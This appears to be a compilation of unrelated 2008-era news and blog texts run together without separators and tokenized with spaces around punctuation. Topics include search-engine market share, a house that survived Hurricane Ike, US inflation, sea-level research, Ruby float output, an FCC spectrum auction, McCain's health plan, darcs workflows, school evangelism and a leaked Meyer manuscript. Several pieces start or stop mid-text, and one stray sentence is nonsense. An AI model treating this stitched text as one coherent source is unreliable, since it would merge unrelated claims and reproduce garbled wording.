In January of that year , Microsoft managed to grab 8.9 percent of the search market .
For June 2008 , the latest month for which Nielsen / NetRatings has released date , Microsoft search properties have grabbed 14.1 percent of the market .
The big loser in this scenario is Yahoo , which dropped from 22.7 percent to 16.6 percent during the same time period .
Unfortunately for both Microsoft and Yahoo , Google has grown from 53.7 percent to 59.0 percent during those 18 months by NNR 's reckoning .
Data source : Nielsen / NetRatings
NetApplications is another source of bad news for Microsoft , which breaks the numbers out by Microsoft property .
Live Search has fared better than its portal sibling over the past year and a half , as to be expected with Microsoft throwing so much weight behind it as a stand - alone Google competitor and heavily marketing Live brand of web applications as a whole .
Unfortunately , the lost MSN search market share has n't translated into increased share for Windows Live .
Microsoft began offering incentives to businesses in March 2007 for getting employees to make a Live Search switch , then extended its pay - to - search ( or perhaps more accurately : shop ) model to the general consumer in May this year .
A series of major overhauls have increased Live Search 's index , UI , and results , and Microsoft even introduced a program for the automotive industry to easily incorporate Live Search services into cars .
The takeway from NetApplications is that Microsoft 's Live strategy has yet to show much in the way of results when it comes to search share .
Data source : Hitwise
Yahoo is a mixed bag .
Comscore essentially has Yahoo's search traffic heading into the toilet , if not swirling down the bowl .
Although Yahoo has seen a modest bump to 20.9 percent since bottoming out at 20.4 percent share in April , it 's a far cry from the 28.1 percent market share the portal enjoyed at the onset of 2007 .
The other metrics firms also have Yahoo on a downward trend , but not as severe a drop as Comscore shows .
Data source : NetApplications
One thing that all four firms agree on : Google rules .
NetApplications has the search giant over 78 percent worldwide as of July , while Comscore has its search share growing from 47.5 percent to 61.5 percent from January 2007 to June 2008 .
Nielsen / NetRatings paints a slightly different , but still positive picture for Google .
As mentioned above , Google has gained 5.3 percentage points of search share over the past 18 months , but the company has been on a downward slope since its April high of 62 percent .
The bottom line is that , at least so far , a lot of the rumbling from Yahoo and Microsoft of open search enhancements and paid search incentives has n't made a dent in Google 's expanding search empire .
Whether users are simply rooted in their Googling ways or Sergey and Larry 's special sauce really is that special , it 's readily apparent why Microsoft really wanted Yahoo's search business .

( CNN ) -- Warren and Pam Adams lost a house to Hurricane Rita in 2005 , so you might think they'd be relieved their new home withstood Hurricane Ike last week .
Helicopter pilot Ray Asgar submitted this aerial shot of the house on Wednesday .
But not when their house is the only one still standing in their section of Gilchrist , Texas .
Ike 's storm surge last week devastated the Bolivar Peninsula town , flattening most of the roughly 200 homes there .
The couple 's yellow house at the beach -- supported 14 feet off the ground by wooden columns -- was the only house on Gilchrist 's Gulf Coast side not to be leveled .
" As we got there , the tears started flowing , " Warren Adams , 63 , said Thursday after his first visit to the home since evacuating .
" There 's a yellow house sitting there , but that 's all .
It was devastating . "
Although the house is there , it might not continue to stand .
Huge storm surges walloped the interior , making it uninhabitable and destroying many belongings .
Appliances , furniture , and a grandfather clock were some of the many things rendered useless .
Warren and Pam , two of the beach town 's several hundred permanent residents before Ike , spent part of Thursday salvaging what they could and lamenting the destruction of their friends ' homes .
Watch homeowner say house may not be salvageable »
" It looked like somebody had dropped a bomb , " Warren Adams said .
" If my house was n't there , I would n't have been able to recognize where I was even at . "
The Adams home had n't been the only one on stilts .
In fact , columns elevated many of Gilchrist 's houses , but some houses were only a few feet off the ground , Warren Adams said .
The survival of the couple 's house , where they started living in April of last year , caused a stir on the Internet .
Helicopter pilot Ray Asgar shot some photos of the house from the air and submitted them to CNN 's iReport.com .
Some who wrote comments about the photos questioned whether they were authentic .
iReport.com : See photos , comments
Aaron Reed , a spokesman with the Texas Parks and Wildlife Department , confirmed that only the Adams ' home survived on that Gulf - side beach .
" I thought , if I were to ever build a house on the coast , I 'm going to contact the guy who built this , " Reed said .
He also said a few other houses on the other side of town were still standing .
Adams said many of Gilchrist 's homes were built before current building codes , and were n't elevated or not elevated nearly as high as his .
The couple owned one of those older houses -- on the same lot where their new home now stands .
Hurricane Rita destroyed the older one three years ago .
Determined to stay because they loved the beach , the couple decided to build something that stood a much better chance of withstanding a strong hurricane .
Adams , a retired electrical designer , had a Galveston , Texas , engineering firm oversee a contractor as his new house was built .
The columns put the house 's bottom floor 14 feet above ground , or about 22 feet above sea level .
Despite that , Ike 's storm surge managed to get in .
" Can we always beat Mother Nature ?
No , " Adams said .
" Mother Nature can be much stronger . "
Adams said roughly $ 300,000 was spent on the house -- the original house payment was $ 180,000 , then he did add - ons / improvements totaling $ 115,000 .
And yes , they are insured .
Adams said he and his wife almost waited too long to leave the house last week .
They boarded the windows and went to bed on the night of September 11 thinking they 'd rise at 5:30 a.m. to evacuate .
But he said that shortly after midnight -- more than 24 hours before Ike 's center would make landfall -- the effects of the storm were hitting .
He awoke to see Pam , 53 , out on the deck , crying .
" I said , ' What 's wrong ? '
She said , ' Water is coming up on the road , ' " he recalled .
So they left at 3:20 a.m. -- not a moment too soon , said Pam Adams ' sister , Judy Hudspeth .

Hudspeth , who spoke with Pam , said the couple encountered a sheriff 's officer as they left the peninsula .
" [ Pam ] said , ' I almost waited too long , ' and the officer told them , ' Yes , ma'am , you did .
You 're really lucky , and you need to get out , ' " Hudspeth , who lives in Richmond , Texas , recalled .
The couple and their two dogs are staying with friends and relatives , and they could get a rental house , Warren Adams said .
But ultimately they'd like to return to Gilchrist if the county will allow people to rebuild there .
" I know there 's a chance you 'll face hurricanes , but that 's the chance you take , " Adams said .
Adams , who has battled cancer , said he hopes he does n't have to wait long for the government 's decision .
" If we can rebuild , a lot of people will rebuild , " he said .
" If we can't , tell us that we can't .
The sooner we can get this behind us , the better . "

Rising food costs contributed to faster inflation in the US
US prices rose by 5.6 % in the year to July , the fastest inflation rate for more than 17 years , figures show .
The rate of inflation was much greater than economists had predicted , driven higher by the 30 % increase in energy prices during the period .
Food costs were 6 % higher than a year earlier , the figures showed .
The price rises are squeezing consumers further .
Inflation - adjusted average weekly earnings fell by 3.1 % in July compared with a year earlier .
Despite the high inflation figure , economists predict the rate will begin to slow from next month as a result of recent falls in the oil price .
Oil reached a record high of $ 147 a barrel in July but has fallen significantly since .
" [ Inflation ] is certainly above expectations here , but I think we 've probably seen , for the near - term anyway , the worse of the inflation readings , " said Keith Hembre , chief economist at First American Funds .
Gary Thayer from Wachovia Securities agreed : " If we do n't get an unexpected shock that pushes commodity prices back up , this might be the worst inflation news that we 'll get for a while . "

A revamp of the Thames Barrier is likely as sea levels rise
Sea levels globally are very unlikely to rise by more than 2 m ( 7ft ) this century , scientists conclude .
Major increases would have to be fuelled by a faster flow of glaciers on the Greenland or Antarctic ice sheets .
But writing in the journal Science , a US team concludes that a rise of 2 m would need glaciers to reach speeds that are " physically untenable " .
However , even increases substantially less than 2 m would cause major issues for many societies , they say .
" Even a sea level rise of 20 cm ( 8in ) in a century will have quite dramatic implications , " said Shad O'Neel from the US Geological Survey ( USGS ) .
Woe betide any government that thinks a 2 m rise in sea level is n't something to take notice of
Dr David Vaughan
British Antarctic Survey " This work is in no way meant to undermine the seriousness of climate change , and sea level rise is something we 're going to have to deal with , " he told BBC News .
Al Gore 's documentary An Inconvenient Truth received some criticism for implying that a rise of 20 ft ( 6 m ) was possible in the near future , although it did not give a definite timeframe .
By contrast , this latest research tallies broadly with the conclusions of other groups that have examined the question using different approaches .
Fast work
In its landmark assessment of climate change published last year , the Intergovernmental Panel on Climate Change ( IPCC ) concluded that sea level rise would probably fit in the range between 28 and 43cm over the century , although 59 cm was a possibility .
The current rate is about 3 mm per year .
But the IPCC specifically excluded the mechanism able to produce the biggest amounts of water quickly - acceleration in the flow of ice from the Greenland and Antarctic ice sheets , the world 's two major ice masses that would between them raise sea levels by about 70 m if they completely melted .
Most of the ice comes off in glaciers .
Scientists know that many of the glaciers have accelerated in recent years - some quite spectacularly .
The Jakobshavn glacier in Greenland , for example , doubled its speed in six years to about 12 km per year .
The acceleration of glaciers is not well understood
But the processes involved are poorly understood , and the IPCC concluded that on that basis it would be unreasonable to draw any conclusions about how far the acceleration might go .
Individual scientists , however , have not be so coy .
The team behind the current research looked at what we do know about Greenlandic and Antarctic glaciers , about the rates of flow and the factors that might prevent acceleration .
" We do n't really know a speed limit for glaciers , " said Dr O'Neel , " but we can look at what we have today and ask ' what would happen if they all behaved like Jakobshavn ? '
" It 's been going fast for several years now and has n't gone another marked increase in speed .
Helheim had a brief period at 14 km per year , Columbia at nine or 10 ; so that kind of figure , in the region of 10 km / year , seems to be about as fast as it gets . "
To achieve a 2 m sea level rise by 2100 , by contrast , every Greenland glacier would have to increase its flow rate to at least 27 km per year and remain at that velocity for the rest of the century .
' Scary ' scenario Antarctica is rather different .
The West Antarctic Ice Sheet rests on rock that is mainly below sea level , meaning that warming seas could increase the rate of ice loss , though again the new analysis suggests this is also very unlikely to result in a catastrophic melt during this century .
David Vaughan from the British Antarctic Survey believes the US team has got its figures about right .
" The point is that whatever happens in this century can only start from present conditions and present rates of sea level rise , and that constrains the rise that can occur this century , " he told BBC News .
" However , if you 're looking further ahead than 2100 - and many governments are , including the Netherlands and the UK which are thinking about infrastructure that would last more than 100 years - then that second century still looks quite scary .
" I certainly do n't disagree with them that we should n't be making outlandish statements about sea level rise , and some outlandish statements have been made ; but the high end of the estimates here is still about 2 m , and woe betide any government that thinks a 2 m rise in sea level is n't something to take notice of .

Ok , ok , joke 's on me . ;-)
That will learn me to fire off blog posts too quickly .
To clarify : Chad and I understand floating point arithmetic and its accuracy problems .
What we were n't thinking clearly on is Float#to_s .
Specifically , what was freaking us out was not the loss of precision on an FP conversion , but the fact that , when asked its value , it was rounding up .
To make the point more clearly , we should have included all the output in the original ruby session :
> s = " 40.87 " " 40.87 " > f = s.to_f 40.87 > ft = f * 100 4087.0 > fti = ft.to_i 4086
I would have liked for this to be true :
> ft * 100 4086.9
but instead , what was true was :
> ft * 100 4087.0
Our confusion stemmed from the fact that we were n't thinking about the fact that irb uses #to_s to display all its values .
And , to demonstrate :
> 4086.9999999999995.to_s 4087.0
Which might be appropriate , but is still annoying .
;-)
Especially given :
> 4086.999999999995.to_s " 4086.99999999999 "
( note : one less unit of precision )
which is what I was originally hoping to see .
To make it all weirder for us , " 40.87 " was the very first value we tried running through this little pain mill , and the only one with any resulting errors .
C'est la vie , I guess .
Update : And , in JavaScript :
> f 40.87 > f * 100 4086.9999999999995 > ( f * 100 ) .toString ( ) 4086.9999999999995
Reported correctly . ;-)
A reader has just written in to inform us about her friend who has been missing for a little less than a week .
Hanna Upp ( pictured ) is a 23 - year - old Spanish teacher in the NYC school system , and was last seen on August 29th near her home in Hamilton Terrace .
According to her roommates she had planned to go away last weekend , but was returning by Sunday .
When she did n't return , they went into her room and found " her keys , her phone , and her handbag containing her wallet .
Her ATM card , her subway card , and her ID ( right now just her passport ) were all in there . "
The police are on the case , and her friends have started a Facebook page to inform others about the situation .
If you have seen Hannah Upp or have any other information regarding the case , contact the 30th Precinct .
Federal Communications Chair Kevin Martin rounded up the geek squad division of the D.C. press corp on Friday to announce that it 's once more into the breach for the agnecy : the FCC is considering a new plan to auction off the public safety portion of the 700 MHz band that it could n't sell in March .
The proposal is quite complex , and sets up not only a contest for a national license , but a bidding system for regional licenses .
There 's even competition between WiMax and Long Term Evolution ( LTE ) high speed wireless systems in the plan .
As Ars spectrum watchers know , the Commission has for years been trying to forge a national broadband service for public safety agencies — fire , medical , police — that will bring interoperability and coordination to agencies who had a tough time communicating with each other during famous emergencies like 9/11 and Hurricane Katrina .
But no bidder would buy the so - called public safety D Block of this year 's 700 MHz auction .
An FCC audit of the setback discovered that potential purchasers just did n't think they could make a profitable go of the single national license as it had been constructed .
And a subsequent request for public comments found that lots of big city public safety agencies would rather see the D Block chopped up into regional licenses that coordinate with each other when necessary .
National vs. regional
Ars had a lengthy conversation with FCC spokesperson Robert Kenny on Saturday , who patiently explained the latest proposal being circulated to the Commissioners .
It is not for the faint of heart .
In essence , as Ars understands it , the auction will operate as a kind of contest between the national public safety vision and the regional public safety vision .
Here 's how it works .
One of the two parallel auctions that the agency plans to hold aims to sell the D Block to a single bidder who will run both a commercial service and share the spectrum with public safety agencies via a leasing system .
This time the FCC has reduced the minimum asking price to 750 million dollars , far less than the previous reserve bidding level of $ 1.33 billion .
The point is not to fatten the United States Treasury , Kenny explained .
" The priority is to try to move this forward . "
In addition , whoever wins the license will get more time to build it out and to be protected by a cap on lease charges from the safety groups .
But on top of that , the FCC will run another auction in parallel , this time for 58 regional licenses .
Bidders will have the option of competing for the licenses in a WiMax or LTE environment .
The agency 's new rules also propose that the auction cannot succeed unless the regional players collectively pony up more money than the national bid raises .
WiMax v. LTE
If , however , the national bid fails again to attract that minimal reserve price , then the auction becomes by default a competition between regional WiMax and LTE .
Whichever license system produces bids that serve the most population or raise the most money will become the preferred platform for the regional licenses , as long as at least 50 percent of those licenses are sold nationally .
The losing transmission type will be ruled out ( i.e. , either WiMAX or LTE ) , and the FCC will re-auction the rest of the licenses in the successful type , at a reduced price .
If this scenario is not complicated enough for Ars readers , take hope .
At present it 's just a proposal that 's circulating among the Commissioners , whose staffs may have additional suggestions for the auction .
And if a majority support the concept at the agency 's next Open Commission meeting , scheduled for September 25 , the Commission will release the plan as a Notice of Proposed Rulemaking .
The subsequent comment cycle could bring additional creativity to the process .
But as Verizon and AT&T prepare to roll out their new LTE systems in the 700 MHz range , and Clearwire and Sprint plot a national WiMax service , this proposed auction could function as an interesting poll for which platform the public sector prefers .
Paganism conjures up a raft of stereotypes - stone circles , witchcraft , devil worship , The Wicker Man .
But one man is determined to set the record straight from a quiet Ainsdale cul - de-sac .
Committed Pagan , Pat Regan , has recently had his second book published - The New Pagan Handbook , in which he highlights the negative images unfairly linked with the religion over the centuries .
He says ' Pagan ' is " one of the most widely abused words in the English language ... often a term used to vilify others as barbarians , thugs or unenlightened non-religious fools . "
Although they have faced prejudice in the past , Pat , 51 , and wife Cath , 45 , are proud of their religion .
Pat began learning about Paganism as a boy after becoming disillusioned with his Catholic upbringing .
" My mum used to take me to church and I did n't like it , " he said .
" I found the images of crucifixion horrific and I used to faint and be carried out of church every Sunday . "
Pat 's love of nature grew to an interest in Paganism , an ancient religion strongly linked with the earth .
" I have always known there is more to it than just enjoying that lovely sunset or appreciating trees and birds , so I did my own research and it appealed to me . "
Cath chose Paganism when their first child , now 21 , was born .
The couple married at Southport 's Town Hall .
Paganism is a flexible religion based on the individual .
Followers must take responsibility for their own actions as they have no devil figure to hold to account for bad behaviour .
They also choose their favoured gods to worship from the ancient Celtic , Roman and Greek deities and how and where to worship them .
" Sometimes we will cast a circle and honour the gods with a few words , but mainly just at the festivals , " Pat said
There are eight annual Pagan festivals , the next of which is Lughnasadh at the end of August - a celebration of the harvest .
Worship can take different forms , from meditation to rituals involving ceremonial circles , candles and incense .
The Midwinter festival takes place on December 21 , predating Christmas by thousands of years .
" We eat drink and be merry , the same as everyone else at that time of year but on the 21st not the 25th , " Pat , founder of the Pagan Anti-defamation Network , said .
" We decorate the house , have a tree - that has very Pagan origins - and ' Father Christmas ' , who is based on Odin , delivers presents . "
Pat has even made appearances as Father Christmas at Pine Pixies pre-school , run by Cath from church halls .
The family came under huge personal strain in 2003 when their religion was revealed in local press .
" I had quite a lot of explaining to do to the church ministers when it came out I was a Pagan , " Cath , who keeps religion out of her pre-schools , said .
" It 's like you have to prove to people that you 're a good person .
It was something awkward I should n't have had to go through . "
The Regans have four children and although they tell them their beliefs they say each is free to pick their own religion .
McCain plan :
Let taxpayers , not employers , subsidize health insurance premiums Associated Press
Published : Sunday July 6 , 2008
Print This Email This WASHINGTON --
There 's a great unknown about Sen.
John McCain 's health plan :
How many employers would drop insurance coverage for their workers because of his tax policies ?
The Republican presidential nominee - in - waiting has proposed that everyone buying health insurance get a refundable tax credit , $ 2,500 for individuals and $ 5,000 for families .
At the same time , he would treat employer contributions toward health insurance like income , meaning workers would have to pay income , but not payroll , taxes on it .
McCain 's Democratic rival , Barack Obama , says the plan would " shred " the employer - based system that provides health insurance to about 158 million workers .
Most health analysts wo n't go that far , but both liberals and conservatives say McCain 's approach would strengthen the individual and small - group insurance market .
And by strengthening that market , it will pull in workers now covered through their jobs .
The workers most inclined to make that transition will be younger , healthier ones who most likely will be able to buy a policy on the individual market for less than their tax credit , said Paul Fronstin , a senior research associate at the Employee Benefit Research Institute , which studies employee benefits .
To the degree that happens , the employer - based market will become less healthy as sicker , older workers stay with their employer - based coverage while more of the healthier workers move to the individual market .
" What you 'll see happening is average cost in the employer - market will go up and average cost in the individual market will go down , " Fronstin said .
" You 'll start to get into a cycle where people at the margin start to leave employer coverage for individual coverage .
At some point , employers will start to ask :
Why am I doing this if my workers do n't value it anymore ?
If I do n't need to do this to be competitive in the labor market , why should I do it ? "
Joseph Antos , who studies health care policy at the American Enterprise Institute , a conservative think tank , said it 's predictable that McCain 's proposal would move more people into the individual market because some workers could simply get a better deal there .
Not only are the premiums typically cheaper for younger , healthier workers , but any difference between the tax credit and the premiums can be redirected into a health savings account .
" This stuff about shredding the employer market , that 's just campaign rhetoric in the sense that nothing changes real quickly in this country , " Antos said .
" We 're not going to see employers drop coverage en masse , and the reason is health insurance benefits remain an important tool for attracting good employees and retaining good employees . "
Employers began offering health insurance as a benefit during World War II , when a labor shortage increased competition for workers .
Wage controls limited employers ' ability to offer higher salaries , so they offered benefits like insurance , pensions and longer vacations to attract the best employees .
Health benefits were not a major expense initially , but they have become a significant part of payroll as health care costs have spiraled upward .
As much as Americans complain about the cost of health care , they like the fact that employers pick up most of their health insurance expenses .
They also like that their share is taken from their paychecks on a pretax basis , and fear anything that could jeopardize that prized benefit .
A poll of employer - insured voters conducted by the Kaiser Family Foundation found that nearly two - thirds thought it would be harder to find a plan that matches their needs and handle administrative issues if they were buying insurance on their own .
Eight in 10 said they thought it would be harder to get a good price for insurance or get coverage if they were sick .
Antos said large companies that compete vigorously for workers would keep the benefit .
Individual losers could include those workers with high insurance premiums , such as company executives or union workers in the automobile industry .
Winners would be younger people who find a basic policy without many bells and whistles appealing .
" It would be a mixed bag for the employer system .
On the one hand , it 's a much more generous tax subsidy than what currently exists for low - and middle - income workers , " said Len Burman , co-director of the Tax Policy Center , a part of the Urban Institute and the Brookings Institution .
" On the other hand , since you can get the credit outside work , some employers would probably drop coverage . "
Burman said a family earning $ 60,000 with a typical employer - provided insurance policy that costs $ 12,100 , of which the employer pays more than 70 percent , gets a tax subsidy amounting to about $ 3,400 under current tax law .
Under McCain 's proposal , that subsidy increases to $ 6,700 , Burman said .
Dan Crippen , an adviser who helped McCain craft his health plan , rejects contentions that there would be any kind of rapid transition from the employer - based system .
He said the benefit of the plan is that it would give people who change jobs frequently a policy they can take with them .
" We 've talked to a lot of employers who have no interest in giving up their insurance now no matter what the system would be , " Crippen said .
" Frankly with the demographics coming into all of this , the retirement of my generation , our country is going to be hard up for workers and employers are going to once again be needing to attract workers , just like the onset of the employer - based system in World War II .
That 's what employers are telling us they will have to continue to do to attract workers . "

I 'm writing this as a a rough for potential rewriting for the darcs wiki section on workflows .
My post on getting the most out of Darcs 2 , through feedback on the darcs mailing list has actually been rewritten into patches for the official manual of darcs .
When those get accepted it will mark my first official contribution to the darcs repository , which is pretty cool .
One of the fascinating things about a DVCS is that first D , distributed .
There are models for working with source control opened up by a good DVCS that would have been unimaginable under a centralized system .
It 's still hard to advocate them to users because they sometimes take a mental leap that sometimes seems unmanageable .
I 'm personally fascinated by these sorts of workflows and I think that darcs is still the best of breed when it comes to allowing projects to experiment with them .
I do n't know of any group currently doing fully distributed development with darcs ( however , I 'd be happy to hear comments about such development ) , but I use partly - distributed development on my own projects and with darcs there are lessons here that apply to even partly - distributed development .
I will use http URIs because it is very easy to set up a simple web server solely for read - only file sharing on every developer 's machine , in any operating system environment .
I 'll use three example developers on local hostnames generically named deva , devb and devc .
The basic theory is that each developer keeps at least one private working repository for the project and one special public repository for the project accessible via http .
I 'll use the generic name project for an example project , thus the public repository for deva for this project will be available at http://deva/project/ .
The only developer with write access to that repository is deva and for everyone else it is only read - only accessible via http .
Notice that this is a very easy security setup .
A good corporate firewall then should easily block as WAN - based ( internet - origin ) attempts to access the internal repositories .
Note Aside : I 've mentioned before that I think the killer protocol to support for a distributed environment is XMPP ( aka Jabber or GTalk ) , where you have a central server to ping for repository status updates ( is this repository currently available for pulling from ? ) , but changes themselves are still sent securely and directly between systems , without touching a central server .
I 'm not going to XMPP addresses , as no DVCS currently supports them .
If someone wants to implement bots for doing it with darcs I 'd be happy to point out where to start , and it should actually be a fairly simple thing to build .
If you want to imagine it anyway , in the following just replace something like http://deva/project/ with xmpp:deva@corp.example.com / project/ .
Note that in this case you can easily use XMPP authentication and authentication lists for some pretty powerful security setups .
The pull - only fully - distributed workflow for each developer is pretty simple ( forgive the unix - isms , but they should be generally readable to Windows users as well , one benefit though is the standard user@system prompt ) :
# Update the latest public patches from fellow devs deva@deva:~/ project / working / $ darcs pull http://devb/project/
# ... interactively decide what to pull ... # ... fix any immediate collisions with working code ... deva@deva:~/ project / working / $ darcs pull http://devc/project/
# ...ditto ... #
Push reliable , tested patches to own public repository deva@deva :~/ project / working / $ darcs push ../ public / # ... interactively choose the good patches ...
There are a couple things to note here as they become even more important later on and can't be overstated :
Each developer only pushes to their public repositories patches that they 've integrated , test and personally " trust " .
Because this is the repository every other developer pulls from , it needs to be kept extraordinarily clean .
Requiring automated tests in each developer 's public repository is one way to help insure this is always the case .
So the first easy complaint is that every developer ends up having to do a pull for each and every other developer , how can that be maintainable ?
This is a complaint I 'll come back to in greater detail further down , but the easy early answers are : this can be automated in a quick script ( there is also repository completion in some shells when working with darcs ) , but more importantly this is necessary an " every time I 'm working " thing .
A developer may only pull changes from other developers once a day or once a week , depending on the project and the project 's needs .
A lot of this precipitates out of normal development conversations and workflows : issue trackers highlight when new important fixes are available in a developer 's repository , mailing list and hallway discussions include sentiments like " You really should grab feature x from devb " and " You need to pull bug fix y from devc ASAP . "
This is also the perfect time to introduce a powerful weapon in the darcs arsenal : -- intersection .
Following the early assertion that developers only push patches that they vouch for , it is very easy for deva to check for patches that both devb and devc agree on :
deva@deva:~/ project /working/ $ darcs pull -- intersection http://devb/project/
http://devc/project/
There is still good reason to check each developers ' individual repositories as well , but consensus checks can easily be done more often and developer to developer communication can help surface times when individual repositories need to be checked .
Release by Consensus
The next easy question : how do you do release management in a fully - distributed system ?
I 've just shown the key tool to do that : -- intersection and " consensus repositories " .
A build manager with a smoke test build system that I 'll nickname bbq , because it 's tasty , on deadline day can very easily grab a consensus build , smoke test it , maybe build - bot it , tag it , and ship it with very little direct contact with the developers : buildman@bbq : project / $ darcs get -- intersection http://deva/project/ \ http://devb/project/ \ http://devc/project/
\ release - ` date +%F ` # ... testing , testing , more testing ...
buildman@bbq:project/release-2008-08-09 / $ darcs tag -m " Release `date +% F` "
The other developers may be encouraged to grab the tag patch so that they can recreate the tag in case of bug reports , but that may or may not be necessary .
Note all of that can be scripted and automated .
You could following the same formula for automated daily builds ( although you probably do n't want to tag every daily build ) and continuous integration build bots .

Its transparency means that we can designate the nature of the mug into its walls .

No apologies , you absolute bastards , for this column returning once again to the horror of crass religious makeover show Make Me A Christian ( Sun , 7 pm , C4 ) , which draws to a close this week having prompted much wailing and gnashing of teeth - 98 % of it in my living room , where each episode has been accompanied by a storm of cries , squawks , and outraged splutters .
The bellows came so regularly and automatically ( as an instinctive physiological response to what I was seeing and hearing ) that after a while I actually forgot it was me making them .
They 'd become part of my flat 's natural ambient soundtrack , like the ticking of the clock or the sound of mould growing in the fridge .
Yell , yell , yell .
It was like living on top of a yell mine .
If you were to measure the volume of my shouts and plot them on a graph , you 'd discover that the number of sonic peaks corresponded precisely to the number of close - ups of head Christian mentor Reverend George Hargreaves ' simpering tortoisey face .
A few weeks ago , after watching episode one , I was so incensed by his self - satisfied air of stubborn intolerance I Googled him as soon as the credits ran .
Before long I 'd uncovered his astonishing backstory : that in the distant past he'd been a DJ and songwriter ( responsible for Sinitta 's So Macho and Cruising ) before becoming the head of the insanely right - wing Christian Party , which wants to denounce homosexuality , teach creationism in schools , reintroduce the death penalty , ban abortions , remove the " satanic " red dragon from the Welsh flag , and basically make a bollocks of everything .
( Fortunately , they 're not very successful , what with the general populace being aware it is n't AD1500 any more .
In the recent Haltemprice and Howden by - election , George received 76 votes .
But , hey , perhaps this TV exposure will build his profile . )
Anyway , George 's background is so juicy and mad , I fully expected the show to make the most of it .
You know : wait till he 's admonishing Laura ( one of the show 's volunteers ; a lesbian ) for her sinful gayness , then have the voiceover say , " But George has n't always been so opposed to homosexuality ... " and BAM ! - cut to Sinitta performing So Macho on Top Of The Pops in 1983 with a caption explaining who wrote it .
And move from there into a cute VT package detailing his loopy political ambitions .
Did n't happen in show one .
Or show two .
Aha , I figured .
They 're saving it for the finale : a classic " reveal " .
Look !
He 's been a vaguely sinister weirdo all along !
Gotcha !
But no .
His past and his party never warrant a mention .
Instead we get the standard makeover show ending : a few participants scratching around for reasons why they feel a bit better about themselves having gone through the sausage machine .
Ignore the faintly upbeat veneer and it's all pretty feeble : none of them appear to have undergone any spiritual transformation whatsoever .
They may have enjoyed several of the " tasks " , such as helping the elderly or throwing a barbecue for the neighbours , but that 's because doing good deeds is fun .
You do n't need Christ whispering in your ear to appreciate the value of loving thy neighbour .
In fact , the biggest hurdle each of them has had to overcome throughout the series is George himself : his robotic intolerance ; his haughty judgments ; his stomach - churning opinions stated as fact .
Choosing him as its " star " has created a bizarre tension at the heart of the programme : the volunteers have been repeatedly told that Christianity is all about love and acceptance by a man who insists the world must adhere to his dementedly fundamentalist interpretation of the Bible .
And by giving George a mainstream televisual platform without once pointing out what a marginal and extremist figure he is , the show is hugely unfair on yer average non-lunatic churchgoer , the majority of whom are far more likely to offer you a pot of homemade elderberry jam than hysterically denounce you as a fornicating sinner .
Yeah , that 's right .
I 'm an atheist defending moderate Christians .
Wanna make something of it ?

Have you had an Exo day at your school ?
Message 0424 SMS SMH ( +61 424 767 764 ) or email us with information .
--------------
Youth Alive describes the events as " a free lunchtime festival … put on by the Christian students as a gift to the school " , but a leaders ' manual prepared by the body reveals that Exo days are aimed at recruiting students to their local youth ministry .
A teacher at one public school said students had returned to class after an Exo day concert complaining about attempts to convert them , while the Federation of Parents and Citizens '
Associations says it is an attempt to sneak evangelism into schools and reveals the need for new laws .
The Exo day instruction manuals obtained by the Herald include numerous references to recruitment and evangelism .
" The whole goal for Exo week and Exo day is to see your youth ministry grow , " it states .
" The vision is to see evangelism and growth come from the students themselves in your youth ministry . "
The manual includes " testimony " from a youth minister working outside Newcastle who states : " Exo day started a rapid increase in the number of salvations within our youth ministry .
" But , most importantly , Exo day has given our young people the belief that they can take their schools for Jesus . "
The Youth Alive website indicates that about 30 NSW public schools have registered to hold Exo days .
Manuals given to the Christian students refer to Exo days as an opportunity to " show our peers that God wants us to have an excellent life " and encourage them to promote the event at school .
Youth Alive declined to comment .
The revelations follow recent Herald reports that Hillsong was running its Shine program - aimed at young women - in at least 20 NSW public schools .
The NSW Education
Act says that " instruction " at public schools must be non-sectarian and secular except in designated religious education classes .
The NSW upper house Greens MP , John Kaye , said Exo days went against the spirit of the act , but that there was a need for new laws specifying " clearly and precisely who is allowed on school campuses and who is not " .
" Parents send their children to public schools in the anticipation that they will not be indoctrinated , " Mr Kaye said .
" What these ministries are doing is seeking to rip off that legitimacy and authority and use it for their own purposes .
We need a protocol that makes it clear that these kinds of things should not be happening . "
A spokesman for the Department of Education said the events were not a cause for concern as they were not compulsory .
He denied they breached departmental guidelines .
Neil Simpson , the principal of Batemans Bay High School , where Exo days have run for several years , agreed they were within guidelines .
" It 's 40 minutes at lunchtime … there 's no hard - core message or evangelising , " he said .
Mr Simpson said he was happy for students to be exposed to different cultural experiences , likening Exo days to the indigenous event NAIDOC .
However , a number of public school teachers said students had complained about evangelism .
A spokeswoman for the Federation of Parents and Citizens ' Association said religious recruitment in schools was inappropriate .
" We need to ensure that children when they go to school are n't exposed to discreet evangelism , " she said .
Writer Stephanie Meyer is n't too happy with the Internet .
The first 12 chapters of her eagerly awaited book , a counter - view novel to Twilight , has hit file sharing sites .
Despite knowing who was responsible , Meyer 's anger seems only to be for her Internet fans , while she plans to cancel the book .
This year we ’ve reported on several book authors who embraced the Internet , and BitTorrent in particular .
Having pirated copies of their books listed on BitTorrent sites such as The Pirate Bay is considered to be an honor to some .
They use it as a promotional tool , and actually sell more books because of it .
One of the prime examples is best - selling author Paulo Coelho , who said he sold thousands of extra books because he pirated his own books .
“ Sharing is part of the human condition .
A person who does not share is not only selfish , but bitter and alone , ” Coelho told Torrent Freak in a follow up interview , explaining why he decided to share his books for free .
Responses to unauthorized filesharing vary .
Those that have embraced it have seen dividends .
Others fight it and throw tantrums , or use it as an excuse .
A prime example of the last category has emerged , in the form of author Stephanie Meyer .
Meyer , best known for her recent hits based around vampires , caters to the ‘ young adult ’ market re-popularized by the Harry Potter books .
In what seems like an echo of what happened to Potter author Rowling , Meyer ’s latest book , Midnight Sun , has leaked online .
Not the entire book , but a major part of the first draft , comprising the first 12 chapters .
Â
Meyer says the source is known to her .
In a statement on her website , she says
“ I have a good idea of how the leak happened as there were very few copies of Midnight Sun that left my possession and each was unique .
Due to little changes I made to the manuscript at different times , I can tell when each left my possession and to whom it was given .
The manuscript that was illegally distributed on the Internet was given to trusted individuals for a good purpose .
I have no comment beyond that as I believe that there was no malicious intent with the initial distribution . ”
Instead of rolling with it , working on reader feedback , and moving on and forward , Meyer is ‘ throwing in the towel ’ on the book for now , putting it “ on hold indefinitely ” .
However , as was reminiscent of the buckcherry debacle , it smells of contrived events .
A June update to her site said that she was working on it , partly due to fan pressure .
A leak that makes her so frustrated to want to write the book in the opposite way from intended , should n’t at the same time leave her ambivalent to the personÂ and Â actions that caused it .
It certainly should n’t leave her attacking her fans with statements such as :
“ Just because someone buys a book or movie or song , or gets a download off the Internet , does n’t mean that they own the right to reproduce and distribute it .
